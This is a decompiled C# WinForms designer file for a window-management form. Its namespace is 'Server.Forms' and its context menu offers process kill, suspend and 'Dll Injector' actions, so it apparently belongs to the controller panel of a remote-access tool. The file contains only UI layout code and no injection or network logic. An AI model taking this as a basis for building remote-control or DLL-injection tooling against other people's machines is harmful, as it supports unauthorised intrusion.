namespace Server.Forms
{
	// Token: 0x020000A3 RID: 163
	public partial class FormWindow : global::Server.Helper.FormMaterial
	{
		// Token: 0x0600049A RID: 1178 RVA: 0x0003AA54 File Offset: 0x00038C54
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x0600049B RID: 1179 RVA: 0x0003AA74 File Offset: 0x00038C74
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			global::System.ComponentModel.ComponentResourceManager componentResourceManager = new global::System.ComponentModel.ComponentResourceManager(typeof(global::Server.Forms.FormWindow));
			global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new global::System.Windows.Forms.DataGridViewCellStyle();
			global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new global::System.Windows.Forms.DataGridViewCellStyle();
			global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new global::System.Windows.Forms.DataGridViewCellStyle();
			this.timer1 = new global::System.Windows.Forms.Timer(this.components);
			this.contextMenuStrip1 = new global::System.Windows.Forms.ContextMenuStrip(this.components);
			this.toolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.sToolStripMenuItem = new global::System.Windows.Forms.ToolStripSeparator();
			this.toolStripMenuItem3 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.stopToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.startToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.dToolStripMenuItem = new global::System.Windows.Forms.ToolStripSeparator();
			this.killProcessToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.toolStripMenuItem2 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.suspendProcessToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.resumeProcessToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.panel1 = new global::System.Windows.Forms.Panel();
			this.materialLabel1 = new global::MaterialSkin.Controls.MaterialLabel();
			this.dataGridView2 = new global::System.Windows.Forms.DataGridView();
			this.Column1 = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.Column2 = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.Column3 = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.Column4 = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.Column5 = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.dllInjectorToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.x64ToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.x32ToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.contextMenuStrip1.SuspendLayout();
			this.panel1.SuspendLayout();
			((global::System.ComponentModel.ISupportInitialize)this.dataGridView2).BeginInit();
			base.SuspendLayout();
			this.timer1.Interval = 1000;
			this.timer1.Tick += new global::System.EventHandler(this.timer1_Tick);
			this.contextMenuStrip1.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.toolStripMenuItem1,
				this.sToolStripMenuItem,
				this.toolStripMenuItem3,
				this.stopToolStripMenuItem,
				this.startToolStripMenuItem,
				this.dToolStripMenuItem,
				this.killProcessToolStripMenuItem,
				this.toolStripMenuItem2,
				this.dllInjectorToolStripMenuItem,
				this.suspendProcessToolStripMenuItem,
				this.resumeProcessToolStripMenuItem
			});
			this.contextMenuStrip1.Name = "contextMenuStrip1";
			this.contextMenuStrip1.Size = new global::System.Drawing.Size(191, 236);
			this.toolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("toolStripMenuItem1.Image");
			this.toolStripMenuItem1.Name = "toolStripMenuItem1";
			this.toolStripMenuItem1.Size = new global::System.Drawing.Size(190, 22);
			this.toolStripMenuItem1.Text = "Refresh";
			this.toolStripMenuItem1.Click += new global::System.EventHandler(this.toolStripMenuItem1_Click);
			this.sToolStripMenuItem.Name = "sToolStripMenuItem";
			this.sToolStripMenuItem.Size = new global::System.Drawing.Size(187, 6);
			this.toolStripMenuItem3.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("toolStripMenuItem3.Image");
			this.toolStripMenuItem3.Name = "toolStripMenuItem3";
			this.toolStripMenuItem3.Size = new global::System.Drawing.Size(190, 22);
			this.toolStripMenuItem3.Text = "Maximize";
			this.toolStripMenuItem3.Click += new global::System.EventHandler(this.toolStripMenuItem3_Click);
			this.stopToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("stopToolStripMenuItem.Image");
			this.stopToolStripMenuItem.Name = "stopToolStripMenuItem";
			this.stopToolStripMenuItem.Size = new global::System.Drawing.Size(190, 22);
			this.stopToolStripMenuItem.Text = "Minimize";
			this.stopToolStripMenuItem.Click += new global::System.EventHandler(this.stopToolStripMenuItem_Click);
			this.startToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("startToolStripMenuItem.Image");
			this.startToolStripMenuItem.Name = "startToolStripMenuItem";
			this.startToolStripMenuItem.Size = new global::System.Drawing.Size(190, 22);
			this.startToolStripMenuItem.Text = "Show / Hide";
			this.startToolStripMenuItem.Click += new global::System.EventHandler(this.startToolStripMenuItem_Click);
			this.dToolStripMenuItem.Name = "dToolStripMenuItem";
			this.dToolStripMenuItem.Size = new global::System.Drawing.Size(187, 6);
			this.killProcessToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("killProcessToolStripMenuItem.Image");
			this.killProcessToolStripMenuItem.Name = "killProcessToolStripMenuItem";
			this.killProcessToolStripMenuItem.Size = new global::System.Drawing.Size(190, 22);
			this.killProcessToolStripMenuItem.Text = "Kill Process";
			this.killProcessToolStripMenuItem.Click += new global::System.EventHandler(this.killProcessToolStripMenuItem_Click);
			this.toolStripMenuItem2.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("toolStripMenuItem2.Image");
			this.toolStripMenuItem2.Name = "toolStripMenuItem2";
			this.toolStripMenuItem2.Size = new global::System.Drawing.Size(190, 22);
			this.toolStripMenuItem2.Text = "Kill Process + Remove";
			this.toolStripMenuItem2.Click += new global::System.EventHandler(this.toolStripMenuItem2_Click);
			this.suspendProcessToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("suspendProcessToolStripMenuItem.Image");
			this.suspendProcessToolStripMenuItem.Name = "suspendProcessToolStripMenuItem";
			this.suspendProcessToolStripMenuItem.Size = new global::System.Drawing.Size(190, 22);
			this.suspendProcessToolStripMenuItem.Text = "Suspend Process";
			this.suspendProcessToolStripMenuItem.Click += new global::System.EventHandler(this.suspendProcessToolStripMenuItem_Click);
			this.resumeProcessToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("resumeProcessToolStripMenuItem.Image");
			this.resumeProcessToolStripMenuItem.Name = "resumeProcessToolStripMenuItem";
			this.resumeProcessToolStripMenuItem.Size = new global::System.Drawing.Size(190, 22);
			this.resumeProcessToolStripMenuItem.Text = "Resume Process";
			this.resumeProcessToolStripMenuItem.Click += new global::System.EventHandler(this.resumeProcessToolStripMenuItem_Click);
			this.panel1.Controls.Add(this.materialLabel1);
			this.panel1.Dock = global::System.Windows.Forms.DockStyle.Bottom;
			this.panel1.Location = new global::System.Drawing.Point(3, 529);
			this.panel1.Name = "panel1";
			this.panel1.Size = new global::System.Drawing.Size(894, 20);
			this.panel1.TabIndex = 1;
			this.materialLabel1.AutoSize = true;
			this.materialLabel1.Depth = 0;
			this.materialLabel1.Font = new global::System.Drawing.Font("Roboto", 14f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Pixel);
			this.materialLabel1.Location = new global::System.Drawing.Point(2, 1);
			this.materialLabel1.MouseState = global::MaterialSkin.MouseState.HOVER;
			this.materialLabel1.Name = "materialLabel1";
			this.materialLabel1.Size = new global::System.Drawing.Size(94, 19);
			this.materialLabel1.TabIndex = 1;
			this.materialLabel1.Text = "Please wait...";
			this.dataGridView2.AllowDrop = true;
			this.dataGridView2.AllowUserToAddRows = false;
			this.dataGridView2.AllowUserToDeleteRows = false;
			this.dataGridView2.AllowUserToResizeColumns = false;
			this.dataGridView2.AllowUserToResizeRows = false;
			this.dataGridView2.BackgroundColor = global::System.Drawing.Color.White;
			this.dataGridView2.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.dataGridView2.CellBorderStyle = global::System.Windows.Forms.DataGridViewCellBorderStyle.None;
			this.dataGridView2.ColumnHeadersBorderStyle = global::System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
			dataGridViewCellStyle.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.TopLeft;
			dataGridViewCellStyle.BackColor = global::System.Drawing.Color.White;
			dataGridViewCellStyle.Font = new global::System.Drawing.Font("Arial", 9f);
			dataGridViewCellStyle.ForeColor = global::System.Drawing.Color.Purple;
			dataGridViewCellStyle.SelectionBackColor = global::System.Drawing.Color.White;
			dataGridViewCellStyle.SelectionForeColor = global::System.Drawing.Color.Purple;
			dataGridViewCellStyle.WrapMode = global::System.Windows.Forms.DataGridViewTriState.True;
			this.dataGridView2.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle;
			this.dataGridView2.ColumnHeadersHeightSizeMode = global::System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
			this.dataGridView2.Columns.AddRange(new global::System.Windows.Forms.DataGridViewColumn[]
			{
				this.Column1,
				this.Column2,
				this.Column3,
				this.Column4,
				this.Column5
			});
			this.dataGridView2.ContextMenuStrip = this.contextMenuStrip1;
			this.dataGridView2.Cursor = global::System.Windows.Forms.Cursors.Default;
			dataGridViewCellStyle2.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle2.BackColor = global::System.Drawing.Color.White;
			dataGridViewCellStyle2.Font = new global::System.Drawing.Font("Arial", 9f);
			dataGridViewCellStyle2.ForeColor = global::System.Drawing.Color.Purple;
			dataGridViewCellStyle2.SelectionBackColor = global::System.Drawing.Color.Purple;
			dataGridViewCellStyle2.SelectionForeColor = global::System.Drawing.Color.White;
			dataGridViewCellStyle2.WrapMode = global::System.Windows.Forms.DataGridViewTriState.False;
			this.dataGridView2.DefaultCellStyle = dataGridViewCellStyle2;
			this.dataGridView2.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.dataGridView2.Enabled = false;
			this.dataGridView2.EnableHeadersVisualStyles = false;
			this.dataGridView2.GridColor = global::System.Drawing.Color.FromArgb(17, 17, 17);
			this.dataGridView2.Location = new global::System.Drawing.Point(3, 64);
			this.dataGridView2.Name = "dataGridView2";
			this.dataGridView2.ReadOnly = true;
			this.dataGridView2.RowHeadersBorderStyle = global::System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
			dataGridViewCellStyle3.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle3.BackColor = global::System.Drawing.Color.FromArgb(17, 17, 17);
			dataGridViewCellStyle3.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 8.25f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			dataGridViewCellStyle3.ForeColor = global::System.Drawing.Color.FromArgb(0, 192, 0);
			dataGridViewCellStyle3.Padding = new global::System.Windows.Forms.Padding(1, 0, 0, 0);
			dataGridViewCellStyle3.SelectionBackColor = global::System.Drawing.Color.FromArgb(0, 192, 0);
			dataGridViewCellStyle3.SelectionForeColor = global::System.Drawing.Color.FromArgb(17, 17, 17);
			dataGridViewCellStyle3.WrapMode = global::System.Windows.Forms.DataGridViewTriState.True;
			this.dataGridView2.RowHeadersDefaultCellStyle = dataGridViewCellStyle3;
			this.dataGridView2.RowHeadersVisible = false;
			this.dataGridView2.SelectionMode = global::System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
			this.dataGridView2.ShowCellErrors = false;
			this.dataGridView2.ShowCellToolTips = false;
			this.dataGridView2.ShowEditingIcon = false;
			this.dataGridView2.ShowRowErrors = false;
			this.dataGridView2.Size = new global::System.Drawing.Size(894, 465);
			this.dataGridView2.TabIndex = 17;
			this.Column1.AutoSizeMode = global::System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
			this.Column1.HeaderText = "Title Text";
			this.Column1.MinimumWidth = 100;
			this.Column1.Name = "Column1";
			this.Column1.ReadOnly = true;
			this.Column2.AutoSizeMode = global::System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
			this.Column2.HeaderText = "Visible";
			this.Column2.Name = "Column2";
			this.Column2.ReadOnly = true;
			this.Column2.Width = 67;
			this.Column3.AutoSizeMode = global::System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
			this.Column3.HeaderText = "Window Handle";
			this.Column3.MinimumWidth = 150;
			this.Column3.Name = "Column3";
			this.Column3.ReadOnly = true;
			this.Column3.Width = 150;
			this.Column4.AutoSizeMode = global::System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
			this.Column4.HeaderText = "Process ID";
			this.Column4.MinimumWidth = 100;
			this.Column4.Name = "Column4";
			this.Column4.ReadOnly = true;
			this.Column5.AutoSizeMode = global::System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
			this.Column5.HeaderText = "Path";
			this.Column5.MinimumWidth = 150;
			this.Column5.Name = "Column5";
			this.Column5.ReadOnly = true;
			this.dllInjectorToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.x64ToolStripMenuItem,
				this.x32ToolStripMenuItem
			});
			this.dllInjectorToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("dllInjectorToolStripMenuItem.Image");
			this.dllInjectorToolStripMenuItem.Name = "dllInjectorToolStripMenuItem";
			this.dllInjectorToolStripMenuItem.Size = new global::System.Drawing.Size(190, 22);
			this.dllInjectorToolStripMenuItem.Text = "Dll Injector";
			this.x64ToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("x64ToolStripMenuItem.Image");
			this.x64ToolStripMenuItem.Name = "x64ToolStripMenuItem";
			this.x64ToolStripMenuItem.Size = new global::System.Drawing.Size(180, 22);
			this.x64ToolStripMenuItem.Text = "X64";
			this.x64ToolStripMenuItem.Click += new global::System.EventHandler(this.x64ToolStripMenuItem_Click);
			this.x32ToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("x32ToolStripMenuItem.Image");
			this.x32ToolStripMenuItem.Name = "x32ToolStripMenuItem";
			this.x32ToolStripMenuItem.Size = new global::System.Drawing.Size(180, 22);
			this.x32ToolStripMenuItem.Text = "X32";
			this.x32ToolStripMenuItem.Click += new global::System.EventHandler(this.x32ToolStripMenuItem_Click);
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.White;
			base.ClientSize = new global::System.Drawing.Size(900, 552);
			base.Controls.Add(this.dataGridView2);
			base.Controls.Add(this.panel1);
			base.Name = "FormWindow";
			this.Text = "Window";
			base.Load += new global::System.EventHandler(this.FormProcess_Load);
			this.contextMenuStrip1.ResumeLayout(false);
			this.panel1.ResumeLayout(false);
			this.panel1.PerformLayout();
			((global::System.ComponentModel.ISupportInitialize)this.dataGridView2).EndInit();
			base.ResumeLayout(false);
		}

		// Token: 0x040002F1 RID: 753
		private global::System.ComponentModel.IContainer components;

		// Token: 0x040002F2 RID: 754
		private global::System.Windows.Forms.Timer timer1;

		// Token: 0x040002F3 RID: 755
		private global::System.Windows.Forms.ContextMenuStrip contextMenuStrip1;

		// Token: 0x040002F4 RID: 756
		private global::System.Windows.Forms.ToolStripMenuItem stopToolStripMenuItem;

		// Token: 0x040002F5 RID: 757
		private global::System.Windows.Forms.Panel panel1;

		// Token: 0x040002F6 RID: 758
		public global::System.Windows.Forms.DataGridView dataGridView2;

		// Token: 0x040002F7 RID: 759
		public global::MaterialSkin.Controls.MaterialLabel materialLabel1;

		// Token: 0x040002F8 RID: 760
		private global::System.Windows.Forms.ToolStripMenuItem startToolStripMenuItem;

		// Token: 0x040002F9 RID: 761
		private global::System.Windows.Forms.ToolStripMenuItem toolStripMenuItem1;

		// Token: 0x040002FA RID: 762
		private global::System.Windows.Forms.ToolStripSeparator sToolStripMenuItem;

		// Token: 0x040002FB RID: 763
		private global::System.Windows.Forms.ToolStripSeparator dToolStripMenuItem;

		// Token: 0x040002FC RID: 764
		private global::System.Windows.Forms.ToolStripMenuItem killProcessToolStripMenuItem;

		// Token: 0x040002FD RID: 765
		private global::System.Windows.Forms.ToolStripMenuItem suspendProcessToolStripMenuItem;

		// Token: 0x040002FE RID: 766
		private global::System.Windows.Forms.ToolStripMenuItem resumeProcessToolStripMenuItem;

		// Token: 0x040002FF RID: 767
		private global::System.Windows.Forms.DataGridViewTextBoxColumn Column1;

		// Token: 0x04000300 RID: 768
		private global::System.Windows.Forms.DataGridViewTextBoxColumn Column2;

		// Token: 0x04000301 RID: 769
		private global::System.Windows.Forms.DataGridViewTextBoxColumn Column3;

		// Token: 0x04000302 RID: 770
		private global::System.Windows.Forms.DataGridViewTextBoxColumn Column4;

		// Token: 0x04000303 RID: 771
		private global::System.Windows.Forms.DataGridViewTextBoxColumn Column5;

		// Token: 0x04000304 RID: 772
		private global::System.Windows.Forms.ToolStripMenuItem toolStripMenuItem2;

		// Token: 0x04000305 RID: 773
		private global::System.Windows.Forms.ToolStripMenuItem toolStripMenuItem3;

		// Token: 0x04000306 RID: 774
		private global::System.Windows.Forms.ToolStripMenuItem dllInjectorToolStripMenuItem;

		// Token: 0x04000307 RID: 775
		private global::System.Windows.Forms.ToolStripMenuItem x64ToolStripMenuItem;

		// Token: 0x04000308 RID: 776
		private global::System.Windows.Forms.ToolStripMenuItem x32ToolStripMenuItem;
	}
}
